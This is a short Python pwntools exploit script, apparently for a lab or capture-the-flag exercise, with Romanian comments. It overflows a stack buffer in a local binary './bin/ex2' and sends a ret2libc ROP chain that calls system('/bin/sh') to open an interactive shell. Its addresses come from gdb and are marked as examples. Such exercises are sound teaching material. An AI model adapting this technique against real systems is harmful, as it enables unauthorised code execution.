#!/usr/bin/env python3
from pwn import *

context.binary = ELF('./bin/ex2', checksec=False)
context.log_level = 'debug'

elf = context.binary

OFFSET = 72

# Valorile astea le iei TU din gdb (exemplele sunt orientative)
SYSTEM = 0x7ffff7dff110    # p/x system
BINSH  = 0x7ffff7f53ea4    # search "/bin/sh"

POP_RDI_POP_RBP_RET = 0x4012b5  # pop rdi; pop rbp; ret

def build_payload():
    payload  = b"A" * OFFSET
    payload += p64(POP_RDI_POP_RBP_RET)  # pop rdi; pop rbp; ret
    payload += p64(BINSH)               # RDI = &"/bin/sh"
    payload += p64(0xdeadbeef)          # junk for RBP
    payload += p64(SYSTEM)              # system("/bin/sh")
    return payload

def main():
    p = process('./bin/ex2')

    # programul afiseaza bannere, apoi apeleaza dream()
    # dream() face scanf in souldream, care ajunge apoi copiat in bad_nightmare
    p.sendline(build_payload())

    p.interactive()

if __name__ == "__main__":
    main()
